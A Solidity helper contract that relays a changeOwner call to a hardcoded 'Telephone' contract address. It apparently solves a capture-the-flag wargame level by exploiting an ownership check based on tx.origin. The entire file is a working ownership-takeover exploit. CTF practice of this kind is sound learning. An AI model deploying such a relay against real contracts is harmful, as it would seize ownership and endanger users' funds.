// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ITelephone {
     function changeOwner(address _owner) external;
}

contract TelephoneHelper {
    address public contractAddr = 0x6Fed5490896dbf3031D2647b0F089216a556bF9e;

    constructor() {
        //owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        ITelephone(contractAddr).changeOwner(_owner);
    }
}
